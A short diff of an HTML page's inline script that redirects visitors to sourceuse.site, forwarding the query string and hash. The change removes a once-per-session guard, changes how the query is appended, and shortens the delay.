@@ -23,13 +23,11 @@
   </div>
   <script>
     (function(){
-      try { if (sessionStorage.getItem('_rd')) return; sessionStorage.setItem('_rd','1'); } catch(e){}
       var qs = window.location.search || '';
       var hash = window.location.hash || '';
-      var base = 'https://sourceuse.site';
-      var sep = base.indexOf('?') === -1 ? '?' : '&';
-      var url = base + (qs ? sep + qs.slice(1) : '') + hash;
-      setTimeout(function(){ window.location.replace(url); }, 1800);
+      var base = 'https://sourceuse.site/';
+      var url = base + (qs ? qs.slice(1) : '') + hash;
+      setTimeout(function(){ window.location.replace(url); }, 700);
     })();
   </script>
   <noscript>
